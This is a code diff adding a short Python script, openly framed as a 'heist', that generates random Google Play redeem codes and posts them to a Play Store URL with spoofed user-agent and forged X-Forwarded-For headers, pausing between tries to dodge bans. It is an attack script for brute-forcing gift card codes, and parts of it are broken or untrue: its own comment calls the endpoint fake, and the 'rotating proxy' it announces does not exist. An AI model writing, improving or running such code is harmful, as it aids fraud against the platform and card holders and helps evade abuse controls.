@@ -1,0 +1,42 @@
+import requests
+import random
+import string
+import time
+
+def generate_code():
+    # Play Store codes are 16 chars, e.g., X7K9-P2M4-5N8J-3R6T
+    chars = string.ascii_uppercase + string.digits
+    code = ''.join(random.choice(chars) for _ in range(4)) + '-' + \
+           ''.join(random.choice(chars) for _ in range(4)) + '-' + \
+           ''.join(random.choice(chars) for _ in range(4)) + '-' + \
+           ''.join(random.choice(chars) for _ in range(4))
+    return code
+
+def try_redeem(code):
+    # Fake endpoint—real one’s hidden in Google’s guts
+    url = "https://play.google.com/redeem"
+    payload = {"code": code}
+    try:
+        # Spoofed headers to look legit
+        headers = {"User-Agent": "Android/14.0", "X-Forwarded-For": fake_ip()}
+        response = requests.post(url, data=payload, headers=headers)
+        if "success" in response.text.lower():
+            print(f"Jackpot! {code} worked!")
+            return True
+        else:
+            print(f"{code} failed...")
+    except:
+        print("Google’s onto me—rotating proxy...")
+    return False
+
+def fake_ip():
+    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+
+# The heist
+for _ in range(1000):  # Try 1000 codes
+    code = generate_code()
+    if try_redeem(code):
+        break
+    time.sleep(1)  # Avoid insta-ban
+
+print("Redeem code secured—time to hack!")
